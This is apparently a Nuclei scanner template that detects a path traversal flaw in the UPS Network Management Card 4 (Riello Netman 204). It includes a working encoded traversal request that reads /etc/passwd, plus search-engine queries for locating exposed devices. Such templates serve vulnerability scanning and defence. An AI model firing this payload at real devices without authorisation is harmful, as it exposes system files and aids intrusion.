id: ups-network-lfi

info:
  name: UPS Network Management Card 4 Path Traversal
  author: s4e-io
  severity: high
  description: |
    UPS Network Management Card version 4 suffers from a path traversal vulnerability.
  reference:
    - https://packetstormsecurity.com/files/177626/upsnmc4-traversal.txt
    - https://www.exploit-db.com/exploits/51897
  classification:
    cpe: cpe:2.3:o:riello-ups:netman_204_firmware:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: riello-ups
    product: netman_204_firmware
    shodan-query:
      - http.html:"ups network management card 4"
      - http.title:"netman 204"
      - http.title:"netman"
    censys-query: services.http.response.body:"netman204"
    fofa-query:
      - body="ups network management card 4"
      - title="netman 204"
      - title="netman"
    google-query:
      - intitle:"netman 204"
      - intitle:"netman"
  tags: packetstorm,ups,lfi,riello-ups

http:
  - method: GET
    path:
      - "{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: word
        part: header
        words:
          - "application/octet-stream"

      - type: status
        status:
          - 200
